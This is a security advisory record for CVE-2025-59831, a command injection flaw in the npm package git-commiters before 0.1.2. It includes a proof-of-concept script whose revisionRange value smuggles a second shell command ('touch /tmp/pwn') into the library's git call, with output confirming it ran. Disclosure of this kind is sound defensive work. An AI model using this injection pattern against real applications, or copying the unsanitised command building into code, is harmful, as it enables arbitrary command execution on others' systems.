advisory_id: npm/git-commiters/CVE-2025-59831
datasource_id: gitlab_importer_v2/npm/git-commiters/CVE-2025-59831
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/npm/git-commiters/CVE-2025-59831.yml
aliases:
  - CVE-2025-59831
  - GHSA-g38c-wxjf-xrh6
summary: |
  `git-comiters` Command Injection vulnerability
  ## Background on the vulnerability

  This vulnerability manifests with the library's primary exported API: `gitCommiters(options, callback)`
  which allows specifying options such as `cwd` for current working directory and `revisionRange` as a revision pointer, such as `HEAD`.

  However, the library does not sanitize for user input or practice secure process execution API to separate commands from their arguments and as such, uncontrolled user input is concatenated into command execution.

  ## Exploit

  1. Install `git-commiters@0.1.1` or earlier
  2. Initiaizlie a new Git directory with commits in it
  3. Create the following script in that directory:

  ```js
  var gitCommiters = require("git-commiters");

  var options = {
    cwd: "./",
    revisionRange: "HEAD; touch /tmp/pwn; #",
  };
  gitCommiters(options, function (err, result) {
    if (err) console.log(err);
    else console.log(result);
  });
  ```

  3. Observe new file created on disk at `/tmp/pwn`

  The git commiters functionality works as expected, too, despite the command execution, which further hinders the problem as it may not be apparent that a command injection occured on a running application.

  ```sh
  @lirantal ➜ /workspaces/git-commiters.js (master) $ node app.js
  [
    {
      email: 'github@qslw.com',
      name: 'Morton Fox',
      deletions: 1,
      insertions: 1,
      commits: 1
    },
    {
      email: 'snowyu.lee@gmail.com',
      name: 'Riceball LEE',
      deletions: 11,
      insertions: 1198,
      commits: 7
    }
  ]

  @lirantal ➜ /workspaces/git-commiters.js (master) $ ls -alh /tmp/pwn
  -rw-r--rw- 1 codespace codespace 0 Jul  1 06:09 /tmp/pwn
  ```

  # Credit

  Liran Tal
impacted_packages:
  - purl: pkg:npm/git-commiters
    affected_versions: vers:npm/<0.1.2
    fixed_versions: vers:npm/0.1.2
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/npm/git-commiters/CVE-2025-59831.yml
weaknesses:
  - CWE-937
  - CWE-77
  - CWE-1035
  - CWE-78
references:
  - url: https://github.com/snowyu/git-commiters.js
    reference_type:
    reference_id:
  - url: https://github.com/snowyu/git-commiters.js/commit/7f0abfedbf506e3a61ac875d91324a8dbe756e84
    reference_type:
    reference_id:
  - url: https://github.com/snowyu/git-commiters.js/security/advisories/GHSA-g38c-wxjf-xrh6
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-59831
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-g38c-wxjf-xrh6
    reference_type:
    reference_id: GHSA-g38c-wxjf-xrh6
